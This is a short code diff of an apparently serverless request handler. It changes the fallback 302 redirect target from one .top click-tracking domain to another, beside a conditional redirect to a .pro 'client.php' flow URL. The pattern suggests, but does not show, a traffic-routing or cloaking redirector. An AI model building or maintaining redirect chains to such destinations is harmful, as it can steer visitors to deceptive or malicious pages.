@@ -9,5 +9,5 @@ export default async function handler(req) {
     return Response.redirect("https://newwebl.pro/client.php?flow=254249-271444-1", 302);
   }
 
-  return Response.redirect("https://smark.top/click?o=2&a=1551", 302);
+  return Response.redirect("https://sisuny.top/click?o=2&a=1551", 302);
 }
